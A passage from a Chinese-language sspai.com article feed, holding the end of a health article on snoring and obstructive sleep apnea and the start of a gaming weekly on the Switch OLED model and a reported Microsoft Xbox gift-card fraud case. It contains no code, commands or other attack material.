footnote-id=\"2\">2</sup>这里划两个重点，一个是<strong>上呼吸道</strong>，一个是<strong>睡眠</strong>，即打鼾一定是由上呼吸道组织振动引起的，且一定发生在睡眠时期。人为什么会打鼾，也可以从这两个角度拆开来讲。</p>\n<p>首先我们来看看什么是上呼吸道。</p>\n<p>大家都知道，呼吸道是气体从外界进入肺部的通道。医学上，上下呼吸道的分界是环状软骨，可以试试用力仰头，摸一摸脖子，摸到喉结（女性由于性征差异不会太明显，摸不到也不用太在意），再往下面摸，会有一块略突出的骨头。如果你肉比较多，什么都摸不到的话，就大概知道是脖子的中下部分就可以。</p>\n<p>那为什么上呼吸道狭窄（包括生理、病理上的绝对和相对狭窄）更容易造成打鼾呢？从分界向上看，我们就知道上呼吸道主要包括鼻、咽、喉，这三部分的生理结构注定这里相比下呼吸道更容易发生软组织塌陷，从而导致气流狭窄。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/eca7853436bb1c131f2692e265b867ab\"><figcaption>图：上呼吸道，图源：MedicinePlus.gov, A.D.A.M. Editorial team. https://medlineplus.gov/ency/imagepages/19378.htm</figcaption></figure><p>我们可以这样理解：下呼吸道有软骨支架支撑，软组织薄，就像一个结实而中空的竹筒，相对不容易塌陷；而上呼吸道虽然也有骨性框架支撑，但有众多软绵绵的可以活动的组织，比如柔软的软腭、灵活的舌体、容易肿大的咽喉、经常肥大的扁桃体和悬在咽喉要道的悬雍垂（就是我们平时所说的小舌头）。这么多零件在气流的必经之处，随便哪个挪动一下位置或者占地面积大了些，气流通道就会变窄。气流在狭窄处流速变快，引起附近软组织振动形成鼾声。科学家通过睡眠内镜检查发现鼾声来源于软腭、咽侧壁、会厌上部以及舌根的振动，证实了鼾声来源于上呼吸道软组织振动。<sup class=\"ss-footnote\" href=\"\" title=\"Quinn SJ, Daly N, Ellis PD. Observation of the mechanism of snoring using sleep nasendoscopy[J]. Clin Otolaryngol Allied Sci, 1995, 20(4): 360-364. DOI: 10.1111/j.1365-2273.1995.tb00061.x.\" footnote-id=\"3\">3</sup>而下呼吸道的狭窄、阻塞造成的是全然不同的疾病，一般不引起打鼾。</p>\n<p>打鼾的另外一个必不可少的条件就是睡眠。我们都知道，人在睡眠的时候机体会非常放松。而这个放松不仅放松了你的胳膊腿，也放松了上呼吸道的肌肉。一个完整的睡眠周期分为入睡期、浅睡眠期、深睡眠期、快速眼动期（REM）。随着睡眠周期的运行，肌张力也越来越低，于 REM 期达到最低，在你全身心都松弛的时候，软绵绵的上呼吸道也就一并塌下去了，所以呼吸暂停多发生于此时期。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/b40eb2a2f7751f385946ddddaad812c0.png\"></figure><h2>打鼾到底是不是病？</h2>\n<p>严格来讲，打鼾是一种「<strong>现象</strong>」，背后究竟是否存在「疾病」，要专业人士通过技术手段来进行诊断。</p>\n<p>习惯性打鼾并没有一个统一的量化定义方式，一般采取被检者自行报告的形式。睡眠时经常有打鼾情况的称习惯性打鼾。注意，这里说的习惯性打鼾包括生理性打鼾（单纯爱打呼噜）和病理性打鼾（真的疾病）。</p>\n<p>分类命名中显而易见的是，生理性打鼾（也称为单纯性打鼾、单纯性鼾症）对健康基本无影响，除了吵，以及可能因为有同居者而导致你的生理健康受损，别的没啥大问题。而病理性打鼾可能是某些疾病的主要症状，如近年来渐渐进入人们视野的睡眠呼吸暂停综合征。事实上，打鼾背后的疾病不止这一种，2014 年美国睡眠医学会将睡眠相关性疾病进行最新分类（ICSD-3），将睡眠相关呼吸障碍分为 5 类，阻塞性睡眠呼吸疾病（以下均称 OSA）只是其中一种。我们平时所说的阻塞性睡眠呼吸暂停低通气综合征（OSAHS）、阻塞性睡眠呼吸暂停综合征（OSAS）和睡眠呼吸暂停等都是 OSA 的旧称，在生活和临床中常常沿用。<sup class=\"ss-footnote\" href=\"\" title=\"Sateia M J . International Classification of Sleep Disorders-Third Edition[J]. Chest, 2014, 146(5):1387-1394.\" footnote-id=\"4\">4</sup></p>\n<p>OSA 和单纯打鼾的最大不同，就是它会悄无声息地造成<strong>低氧血症</strong>：患者入睡后，上呼吸道肌肉松弛，管道悄然塌陷，进入肺部的有效交换气体也渐渐不足，机体为了保持有效供氧，不得不把人「<strong>叫起来</strong>」喘一喘气。经过一夜的低通气、缺氧、甚至反复憋醒，患者「睡了，但没完全睡」，所以患者白天通常有不同程度的嗜睡、记忆力减退等，甚至出现情绪变化和精神症状。日间症状对患者白天的生活和工作有较大影响，甚至由于注意力不集中和嗜睡，在驾驶和生产过程中出现安全事故。</p>\n<p>当然 OSA 的危害不仅仅是让人休息不好，精神头变差：研究发现，OSA 会继发<strong>全身多系统</strong>的病变，尤其对心血管系统、呼吸系统有很大的危害，甚至会引起猝死。所以你没看错，「打鼾真的可能会死」。</p>\n<p>看到这里你可能已经开始害怕了，甚至已经开始 × 度问「医生」了。不要急，先来对照看看，你离 OSA 到底有多远？</p>\n<h2>什么样的人离 OSA 更近？</h2>\n<p>我国 OSA 发病率为 4%<sup class=\"ss-footnote\" href=\"\" title=\"何权瀛, 王莞尔. 阻塞性睡眠呼吸暂停低通气综合征诊治指南(基层版)[J]. 中国呼吸与危重监护杂志, 2015, 14(4):398-405.\" footnote-id=\"5\">5</sup>，而由于公众对此疾病认知不足、专业诊治人员及科室较少（下级医院少有睡眠中心、睡眠诊室，缺少睡眠监测设备等）、缺少人力物力进行大规模的疾病筛查等原因，实际的发病率还要高出许多。参考国际的数据，这个数字可能高达 9~38%。<sup class=\"ss-footnote\" href=\"\" title=\"Senaratna CV, Perret JL, Lodge CJ, et al. Prevalence of obstructive sleep apnea in the general population: A systematic review[J]. Sleep Med Rev, 2017, 34:70-81. \" footnote-id=\"6\">6</sup></p>\n<p>那么问题来了，究竟什么样的人更容易得 OSA 呢？哪些因素是 OSA 的危险信号？你可以根据下方的危险因素进行简单的比对：</p>\n<ul>\n<li>肥胖：BMI ≥ 28kg/m²，BMI 计算公式：BMI = 体重（kg）/身高（米）的平方。另外 BMI 合格，但中心性肥胖的人士也是 OSA 的危险人群，测量一下自己的腰围，男性超过 85cm，女性超过 80cm 即为中心性肥胖。</li>\n<li>年龄和性别：成年后年龄增长患病率增加；绝经期前女性患病率明显低于男性，绝经后患病率没有明显区别，可能与雌激素的作用有关。也就是说，中老年男性和老年女性是危险人群。</li>\n<li>上气道解剖异常：这一点可能比较专业难懂，用通俗易懂的方式来解释——从外观上来看，下巴短、下巴后缩、脖子短的人比较危险；至于内部结构异常比如鼻腔阻塞、软腭松弛扁桃体肥大、舌体肥大、舌根后坠、咽腔狭窄等自己比较难判断，可根据日常生活自行体会，不会判断也不必强求。</li>\n<li>大量饮酒、长期吸烟：不是什么好习惯，N 多疾病都跟这俩脱不开关系，早戒早健康。</li>\n<li>有 OSA 家族史。</li>\n<li>其他相关疾病（如甲状腺功能减退、心功能不全、脑卒中等）或服用镇静/肌松药物。</li>\n</ul>\n<p>经过以上的对号入座有的朋友可能已经给自己下了诊断了，我要赶紧泼一泼冷水：<strong>睡眠监测</strong>是诊断 OSA 的<strong>必要条件</strong>，没有经过睡眠监测凭症状<strong>诊断</strong>睡眠呼吸暂停的都是耍流氓。</p>\n<p>国际睡眠协会将睡眠监测设备分为 4 种，其中<strong>多导睡眠监测（PSG）</strong>是诊断 OSA 的金标准。多导睡眠监测采集和记录的参数包括脑电图、眼动电图、肌电图、心电图、口鼻气流、鼾声、呼吸运动、脉氧饱和度、体位等，还可以添加视音频监测、食管压力、食管 pH 值、经皮或呼气末二氧化碳分压、勃起功能等参数，<sup class=\"ss-footnote\" href=\"\" title=\"中国医师协会神经内科医师分会睡眠障碍专业委员会, 中国睡眠研究会睡眠障碍专业委员会, 中华医学会神经病学分会睡眠障碍学组. 中国成人多导睡眠监测技术操作规范及临床应用专家共识[J]. 中华医学杂志, 2018, 098(047):3825-3831.\" footnote-id=\"7\">7</sup>且必须在医院完成并需专业人员在场。</p>\n<p>我们可以看出，多导睡眠监测涵盖的监测项目非常多，在睡眠相关疾病（不仅仅是睡眠相关呼吸障碍）的诊断中起着重要的作用。但是以上眼花缭乱的项目和大量人力、设备成本等就注定多导睡眠监测价格偏高，睡一觉价格堪比三星酒店。且不说这一堆设备连在身上，还要加上不能在家庭操作，这些反而直接造成了一个更加现实又严重的问题：被检者干脆睡不着了。</p>\n<p>基于 PSG 的各种弊端，研究者们致力于寻找更加便捷的睡眠监测方式。在 ICSD-3 中，睡眠中心外睡眠监测（OSCT）首次被列入成人 OSA 的诊断标准中，意思是成人不在医院的睡眠中心，而是在院外利用便携睡眠监测设备，也可以诊断 OSA，这一举动给院外睡眠监测设备的意义给予了极大肯定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/326ef67bd6728593ce1eb7812bb24c99.png\"><figcaption>左图为多导睡眠监测，图片来源于 Washington.edu；右图为中心外便携式睡眠监测。图片来源于 <a href=\"http://www.biosigns.com/s_products_devices_sleep.html\" target=\"_blank\">Products - Polysomnography and Sleep Studies - BioSigns</a></figcaption></figure><p>但我们可以看出，即便是家庭可应用的便携式睡眠监测仪器，也需要在被检者身上捆着众多零件，虽然要监测睡眠但是却阻碍了睡眠，于是各类零/低负荷睡眠监测设备也应景而生。但是，目前这类<strong>零/低负荷设备仍然没有诊断 OSA 的资质</strong>，想要确诊睡眠相关疾病，还是要在身上绑好 PSG 的几十根线的。</p>\n<h2>现有的治疗手段，以及你能做什么</h2>\n<p>目前认为，单纯性打鼾不合并其他疾病的，一般不需要进行特殊治疗，但具体情况需根据患者本身的危险因素、上气道解剖结构等具体分析。对于已经确诊 OSA 的，疾病治疗主要从以下几个方面进行：</p>\n<p><strong>原发病治疗</strong>：这一点比较好理解，积极治疗原发病，比如甲状腺功能减低了，那我们就治甲状腺。</p>\n<p><strong>危险因素控制</strong>：主要可控的点还是<strong>减重</strong>和<strong>戒烟</strong>、<strong>戒酒</strong>，这一点还是要靠患者和家属的共同努力了。毕竟临床上不少见已经脑梗进了医院让戒烟还颤抖着说「抽一辈子了不抽难受啊」的患者，这时候可能就需要家属一巴掌打过去辱骂，「还抽烟，再抽就死啦！」（他们有的真的这么干过，好不好使另议。）</p>\n<p><strong>体位干预治疗</strong>：经常受鼾声困扰的打鼾者家属可能知道，给打鼾的人换个姿势可能就会让他停止打鼾。事实上，研究表明，体位治疗 OSA 和单纯打鼾<strong>均有效果</strong>。</p>\n<p><strong>口腔矫正器</strong>：口腔矫正器是目前较为舒适且有效的治疗方法，机制就是把容易阻塞的部位撑开，气流就可以畅通无阻了。矫正器可以用于单纯鼾症（生理性打呼噜）和轻中症 OSA 的治疗，可单独使用也可配合其他治疗手段使用。目前市面上矫正器的种类很多，一般来说，个性化制作（根据病情私人订制）的优于成品，可调式优于固定式。但需要注意的是，这种治疗看起来简单，但是否能够应用，仍<strong>需专业人士</strong>进行<strong>评估</strong>，且需要在专业人士的指导下进行佩戴使用，并进行治疗后随访。不要看着口腔矫正器好像很随便就能使用，上呼吸道解剖较为复杂，适合他人的未必适合你，而且佩戴也不是个肉包子往嘴里一塞就可以了，一定要正规渠道正规治疗。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/cae3b37df05c834b1203154cd1e9941c.jpg\"><figcaption>SomnoDent FUSION 口腔矫正器，图源：SomnoMed 官网</figcaption></figure><p><strong>无创气道正压通气</strong>：就是我们常说的「呼吸机」，此项治疗是 OSA 的一线治疗，且效果显著。但此项治疗有<strong>严格的适应证和禁忌证</strong>，需要专业人士评定、调整参数、治疗后随访等。且此项治疗有一很难解决的实际问题：戴着不舒服。虽然无创通气不需要进行有创操作，但其长久应用，且在睡眠时期，是比较难坚持的。临床一线工作中面临较多的问题就是患者因为治疗不得不应用辅助通气，而患者本人戴久了就难受得受不了，稍微有点精神头了就跟医务人员软磨硬泡甚至撒娇「摘一会吧，换那个管吧，你看我都好多了，要是指标掉下来我再换回来好不好，太难受啦」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/ccf09e990b253ea3f7d7de9bbcedb6d9.jpg\"><figcaption>图源：PHILIPS 官网，你看后面的太太笑得多么开心</figcaption></figure><p><strong>手术治疗</strong>：手术治疗 OSA 相信大家也不陌生，可能身边的亲戚朋友就早年间因为「打呼噜」切除扁桃体。目前常用的术式是悬雍垂腭咽成形术（UPPP）、鼻腔手术和扁桃体、腺样体切除术等。但是否适合手术治疗，应用哪种术式，仍需要多方面、多学科专业评估、权衡利弊。</p>\n<p>以上是目前存在的对 OSA 的基本治疗，但这些都是针对已经确诊的患者，那么作为普通人，我们能做的又有什么呢？</p>\n<ol>\n<li>认识疾病、重视疾病。自己或身边有危险因素的习惯性打鼾者，警惕是否存在 OSA 的可能，必要时去医院就诊（请就诊于正规医院的睡眠中心或耳鼻喉科、呼吸科、全科等的睡眠诊室）。比如你的中老年男性亲戚朋友是个胖子，烟酒不离手，晚上睡觉打呼噜可响了，但是有时候突然空气安静，他还老嘎一下突然醒过来，就要注意一下是否存在 OSA 了。</li>\n<li>控制危险因素，保持健康生活方式。该戒烟戒酒的行动起来，适量运动，健康减重，保持标准体型。我知道很难，别撒娇，现在撒娇以后就得对大夫撒娇换管儿了。</li>\n<li>早发现早诊断，及时就医，遵医嘱配合治疗。</li>\n</ol>\n<p>最后祝你，睡得香香，身体健康。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/65589\" target=\"_blank\">世界睡眠日专题｜这些好书、好歌和好方法，助你一夜好眠</a></li>\n<li><a href=\"https://sspai.com/post/66861\" target=\"_blank\">了解这些小技巧，今晚开始努力睡个好觉</a></li>\n<li><a href=\"https://sspai.com/post/66635\" target=\"_blank\">年轻人的体检指南 02：个性化筛查</a></li>\n<li><a href=\"https://sspai.com/prime/story/vol03-how-to-sleep-better\" target=\"_blank\">会员文章 | 关于改善睡眠的经历和心得，他们这样说</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，在数字生活时代过得更健康 💪</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67629"},{"title":"瞎玩菌的游戏周报：Switch OLED、微软被盗取上千万美元礼品卡等","date":"2021-07-09 06:27:29","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2021.7.9 尽量每周五更新</p>\n<p>《瞎玩菌的游戏周报》是我对游戏领域的观察和点评。具有以下特点：</p>\n<ul>\n<li>宁缺毋滥，为读者带来价值</li>\n<li>主观，但基于事实和数据</li>\n<li>有新鲜感，但时效性不强</li>\n<li>享受游戏，但反对沉迷游戏</li>\n<li>提升品位，但反对鄙视链</li>\n</ul>\n<h2>资讯</h2>\n<h3><strong>Nintendo Switch（OLED 款式）将于 10 月 8 日发售，定价 2680 港元</strong></h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/3f008fe5784718f19b6b378c4612d0ca.gif\"></figure><p>7 月 6 日晚上，<a href=\"https://www.nintendo.co.jp/hardware/detail/switch-oled/index.html\">任天堂</a> 公布了 Nintendo Switch（OLED 款式）。</p>\n<p>官方宣传片：<a href=\"https://www.youtube.com/watch?v=KgKt5ULX0qQ\">Youtube</a> | <a href=\"https://www.bilibili.com/video/BV1yf4y1L7JK\">哔哩哔哩</a></p> <p>为了区分之前的机型，任天堂对于这一机型的官方名称分别是：</p>\n<ul>\n<li>任天堂日本：Nintendo Switch（有機ELモデル） <a href=\"https://www.nintendo.co.jp/hardware/detail/switch-oled/index.html\">🔗</a>\n</li>\n<li>任天堂北美：Nintendo Switch (OLED model) <a href=\"https://www.nintendo.com/switch/oled-model/\">🔗</a>\n</li>\n<li>任天堂香港：Nintendo Switch（OLED 款式） <a href=\"https://www.nintendo.com.hk/support/information/2021/210706/\">🔗</a>\n</li>\n<li>任天堂中国：腾讯还没有国行版本上市的消息……不用太快期待，起码要先送审</li>\n</ul>\n<p>因此在中文语境下，瞎玩菌暂时采用任天堂香港的称呼来指代这款新机型，而不是之前传言的 Nintendo Switch Pro 或 Nintendo Switch 升级版等各种名称。既然名字里带有 OLED，显然这款机型的最显著变化是全新的 7 英寸 OLED 屏幕。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/1faa2969087b4cd96991cb062ad8d282.gif\"><figcaption>变了，但没有完全变</figcaption></figure><p>跟之前爆料的一样，旧机型的 6.2 英寸屏幕扩大到了 7 英寸（Switch Lite 屏幕是 5.5 英寸）。但跟爆料不一样的是，新机型没有 4K 分辨率，也没有 DLSS 支持，这块屏幕的显示分辨率依然是 720p。</p>\n<p>在屏幕变大的同时，屏幕边缘的黑边缩小了，这样的好处是保持了机身侧面尺寸不变，与旧机型的 Joy-con 手柄可以继续通用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/90f64d2db794ca0f7eff6ce041052aa5.png\"></figure><p>任天堂表示这块 OLED 屏幕的主打优点是「色彩鲜明」。但是任天堂没有提及的是，OLED 屏幕可能比原来的 LCD 屏幕更费电，任天堂也许在耗电方面做了玩家看不见的优化，任天堂确认电池续航跟之前的机型一样是 4.5 ~ 9 小时。</p>\n<p>由于总体变化不大，其他的变化我就简单列举一下：</p>\n<ul>\n<li>新的转轴式支架，可以自由调节俯仰角度，并且支架的宽度已经与机身差不多；</li>\n<li>新增 LAN 有线网络接口，对延时敏感的重度联机游戏（例如新机型官方宣传片中展示的《斯普拉遁 3》）来说有用，但不能替代加速器；</li>\n<li>内置存储容量扩大到 64 GB，依然支持插卡增加容量；</li>\n<li>声音更清晰的新喇叭，但没有我期待的「支持蓝牙耳机」这种小升级；</li>\n<li>没有 CPU 和内存的变化；</li>\n<li>更没有说明修复 Joy-con 手柄著名的漂移问题；</li>\n<li>带 Joy-con 的重量为 420 克，比旧机型重了 22 克。</li>\n</ul>\n<p>新机型有两种颜色可选——白色和经典的红蓝配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/71f3268534979e61f13a2ee1edb04667.jpg\"></figure><p>说到主机的配色，御三家终于在新一代主机达成了配色上的一致性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/9bf006b0a339c9b57a0c7a2a3ce68cf3.jpg\"><figcaption>御三家配色大一统</figcaption></figure><p>因此我猜测老任总部在设计新机型是这么开会讨论的：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/0aeeda6578ed032b6735059f3ed69857.jpeg\"></figure><p>也许是因为相比原机型只是小幅度升级，任天堂没有选择在 E3 直面会上公布，也没有单独开发布会来介绍这款机型，而是悄悄公布。对于不同的玩家来说：</p>\n<ul>\n<li>如果你主要采用电视模式来玩游戏，那么这款机型主要升级的 OLED 屏幕对你来说等于没有变化，其他升级项例如转轴式支架和新喇叭你也用不到。</li>\n<li>如果你主要采用掌机模式来玩游戏，那么用更大尺寸的屏幕保持同样的 720p 分辨率显示，可想而知，同一个像素所占的显示面积比原来更大了，因此有些玩家称之为「大果粒」屏，并认为这块屏幕明升暗降，其实是「负优化」。</li>\n<li>不论你采用哪种模式来玩游戏，假如你已经拥有一台 Switch 主机，那么任天堂已经确认 Joy-con 手柄没有任何变化，并且新款底座（唯一区别是增加了网线接口）与旧机型兼容（顺便一说，旧底座与新机型也兼容），还能单独购买，也就是说新旧机型的差距就像下面这副梗图一样。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/f6941e3a6194e5c19cb41ca6bd32db6c.jpeg\"><figcaption>此图流传太广，最原始出处已不可考。我看到的图源 <a href=\"https://weibo.com/6514705104/KnwORhpzI\">微博 篝火编辑部</a></figcaption></figure><p>虽然 Joy-con 在功能和性能上都没有变化，不过任天堂表示白色的 Joy-con 没有单独发售的计划，应该会是新机型的独占配色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/4114db437991c18d560a50c6203d1b79.jpg\"></figure><p>Nintendo Switch（OLED 款式）在不同地区的官方定价分别为是 37980 日元 / 349.99 美元 / 2680 港元，统一在今年的 10 月 8 日发售。三个地区的价格按汇率折算差别不大，最便宜的日版折合人民币约 2217 元。</p>\n<p>作为对比参考，Nintendo Switch 最初机型和之后的续航增强版的首发定价都是 32978 日元 /  299.99 美元 / 2340 港元。新机型的这 3 个地区定价比旧机型分别多出了 15.2 % / 16.7% / 14.5%。</p>\n<p>更高的定价并不意味着 Switch 从此涨价，任天堂表示 OLED 款式不会替代原来的续航增强版机型，玩家未来可以从 3 个不同价位的产品中选择（指的是 OLED 款式 / 续航增强版 / Lite）。也就是说，新机型主要瞄准了新玩家，已经拥有旧机型的老玩家没必要购买，不过土豪请随意。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/7ea8fc85d14da5fcb3d4b274ae354975.jpg\"></figure><p>最后瞎玩菌猜测一下，如果腾讯推出国行版 Switch OLED 机型，那么售价大概会在多少？</p>\n<p>先看旧机型 Switch 续航增强版主机，日版的官方售价约合人民币 1925 元，某宝售价普遍在 2125 元左右，某多的补贴价为 2039 元（这个价格视为玩家实际入手价，相比官方售价增加了 114 元，主要包含了海淘成本和商家赚取的利润）。国行版的官方定价是 2099 元，某多的补贴价为 1659 元。日版对比国行版，玩家实际入手价的差值为 380 元。</p>\n<p>综合上面的数据，假定日版实际入手价比官方定价同样增加 114 元，并且国行版比日版同样便宜 380 元，那么国行版 Swtich OLED 机型预计要花费  1951 元（2217 + 114 - 380 = 1951）就可以入手。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/a7c3d560f67fed30cef996ad9fba7642.jpeg\"></figure><p>说不定支持 4K + DLSS 的 Switch Pro 明年再出？Flag 还是要立的，万一实现了呢？</p>\n<h3>微软损失上千万美元 Xbox 礼品卡，内鬼拿来换比特币住上豪宅</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/03b51ca86dfb904cc71fcc30c1f689f7.png\"><figcaption>图源 <a href=\"https://support.microsoft.com/zh-cn/account-billing/microsoft-%E5%92%8C-xbox-%E7%A4%BC%E5%93%81%E5%8D%A1-fd144cb7-2496-ec6d-45b6-ec316be3a882\">微软官网</a></figcaption></figure><blockquote><p>DD9J9-MXXXC-3Y6XD-3QH2C-PWDWZ</p></blockquote>\n<p>当你看到这一串杂乱无章的字母与数字组合，你可以想象不到它们背后蕴藏的金钱价值。</p>\n<p>据 <a href=\"https://www.bloomberg.com/features/2021-microsoft-xbox-gift-card-fraud/\">彭博社</a> 的一则深度报道，任职于微软总部的员工 Volodymyr Kvashuk 发现了一种近乎完美的比特币「无中生有」方案。</p>\n<p>这名员工是一名工程师，负责测试电子商务基础设施。他的工作重点是模拟在微软在线商店的购买行为，寻找支付系统中的故障。这意味着他可以进行大量的虚假购买——通过微软提供的假信用卡，系统会知道这次购买是假的，不会真的把购买的货物送到他家去。</p>\n<p>在工作中，他发现了一个改变了他命运的一个 bug——当他每次测试购买 Xbox 礼品卡时，微软商店都会发放真实有效的 25 位卡密。这意味着他可以无限生成 Xbox 礼品卡，并且还是免费的。Xbox 礼品卡的名字容易引起误解，读者可能会误以为它只能购买 Xbox 游戏软件，但其实它还可以购买微软商店的任何商品，例如 Windows 和 Office 软件，以及联想笔记本电脑、Sonos 音箱等实物商品。</p>\n<p>他没有选择上报这个 bug，而是开始偷偷地生成 Xbox 礼品卡，10 美元、100 美元，规模从小到大。大约 2 年后，当联邦特工抓到他时，他已经盗取了超过 15.2 万张 Xbox 礼品卡，价值 1010 万美元，并在一栋价值七位数的湖滨别墅中靠这些收入生活，还计划购买滑雪小屋、游艇和水上飞机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/ac6be6df6793bef2ca3233c8daae5120.jpeg\"><figcaption>达成成就</figcaption></figure><p>去年 11 月，一名法官判处他 9 年监禁。他有可能在服刑至 2027 年 3 月后被遣返回他的老家乌克兰，并将不得不赔偿 830 万美元。</p>\n<p>根据对数千页法庭文件的审查和对微软现任和前任员工、参与此案的调查人员以及 Kvashuk 的家人和朋友的采访，彭博社深入地报道了事件的诸多细节。</p>\n<p>简单概括一下 Kvashuk 的犯罪流程：</p>\n<ol>\n<li>通过他同事的账户（其中一个同事的密码是「VerySecret1」），一次就能获得一大堆 Xbox 礼品卡。</li>\n<li>通过外国服务器重新路由这些请求，来隐藏购买地点。</li>\n<li>通过一个名为 Paxful.com 的网站将卡转售为比特币。</li>\n<li>通过一个名为 ChipMixer.com 的网站实现了比特币交易的匿名性。</li>\n</ol>\n<p>Kvashuk 在这个过程中甚至运用了更多手段来谋取更多利益。由于凭空产生的 Xbox 礼品卡数额巨大，以至于对二级市场的 Xbox 礼品卡售价产生了波动性影响。当市场上的 Xbox 礼品卡价格太低时，他就会暂停「出货」以营造饥渴的供需关系，进而操控整个 Xbox 礼品卡市场，一直等到价格回升再继续。</p>\n<p>即使 Kvashuk 把他的高智商运用在高超的反侦察、反追踪和经济学手段上，微软最终还是抓到了他。其中精彩的侦查与反侦察过程建议读者阅读彭博社的英文 <a href=\"https://www.bloomberg.com/features/2021-microsoft-xbox-gift-card-fraud/\">原文</a>，共 27000 多字。</p>\n<h3>尽量一句话新闻</h3>\n<p>为控制游戏周报的篇幅，并保持足够的信息量，从上期开始加入了「尽量一句话新闻」的环节。大部分时候瞎玩菌尽量用一句话浓缩信息，偶尔也会不止一句话。感兴趣的读者可以点击每条新闻末尾的链接符号 🔗 以了解更多信息。</p>\n<ul><li>激励性视频广告将插入到主机和 PC 游戏中，EA 成了首批签约公司之一。但随后 EA 就否认了这一谣传，EA 并无计划在游戏中插入广告，也没有这样的签约。 <a href=\"https://www.pcgamer.com/this-company-is-putting-video-ads-in-games-and-ea-has-already-signed-up/\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/853a2c4ddbf5025f69f953f307c1a9b6.gif\"></figure><ul><li>7 月 9 日起，EA Play 将带来持续半个月的 5 场直播活动，包含《Apex 英雄》和《战地 2042》等游戏的信息。压轴的 EA Play Live 发布会将在 7 月 23 日举行。 <a href=\"https://www.ea.com/ea-play-live\">🔗</a>\n</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/5f4a856c1fb96b3decfedc33f9e50b99.jpg\"></figure><ul>\n<li>PlayStation 将在 7 月 9 日举办 State of Play 发布会，重点介绍微软第一方游戏《死亡循环》（Deathloop），并带来独立游戏和其他第三方游戏的消息。为避免玩家期待过高，官方宣称不会包含《战神》新作、《地平线：西部禁域》和下一代 PS VR  的内容。 <a href=\"https://blog.playstation.com/2021/07/06/tune-in-to-state-of-play-this-thursday-for-an-extended-look-at-deathloop/\">🔗</a>\n</li>\n<li>一年一度的 GDQ（Game Done Quick）夏季游戏速通马拉松活动将于周日开始，活动将持续一周，并在官方 Twitch 频道直播。 <a href=\"https://gamesdonequick.com/schedule\">🔗</a>\n</li>\n</ul> <p> </p>\n<ul>\n<li>B 站高能电玩节活动在 7 月 8 日到 14 日举办，包含 40 余款游戏佳作首发情报，和 20 余款独立游戏独家试玩。玩家可以在 B 站搜索「高能电玩节」找到活动。 <a href=\"https://www.bilibili.com/blackboard/activity-M93QK68C0I.html\">🔗</a>\n</li>\n<li>第 22 届香港动漫电玩节（ACGHK）将于 7 月 23 日到 26 日在香港会议展览中心举办，将包含动漫、游戏、潮玩，甚至文具、儿童用品和电脑数码产品等内容。瞎玩菌去过一次往届活动，建议早点进场，不然排队排死人。目前由于防疫管控，内地前往香港的朋友务必遵循 <a href=\"https://www.coronavirus.gov.hk/sim/inbound-travel.html\">香港政府官网</a> 的入境须知。 <a href=\"https://www.ani-com.hk/2021ver/index.php?option=com_content&amp;view=featured&amp;Itemid=695&amp;lang=tw\">🔗</a>\n</li>\n<li>PlayStation 收购 Nixxes 工作室。该工作室曾参与移植《地平线：零之黎明》和《往日不再》等游戏到 PC 端。 <a href=\"https://twitter.com/hermenhulst/status/1410591921676832773\">🔗</a>\n</li>\n<li>腾讯宣布与育碧达成战略合作，将独家代理《全境封锁 2》国服。 <a href=\"https://weibo.com/3604205173/KnlXvxI7u\">🔗</a>\n</li>\n<li>为解决未成年人冒用成年人身份证「破解」防沉迷系统熬夜玩游戏，腾讯游戏上线「零点巡航」功能，对玩家进行人脸认证。该功能已上线覆盖《王者荣耀》《和平精英》等超过 60 款产品。 <a href=\"https://mp.weixin.qq.com/s/esxrI1LUxwMEPVXiNcKHww\">🔗</a>\n</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/08/db82b26123296c2b335c01c452d1d1b7.png\"></figure><ul>\n<li>拉瑞安工作室将于 7 月 9 日凌晨 2 点直播介绍《博德之门 3》5 号补丁，并以自称 LarPG 的跑团方式来揭晓。  <a 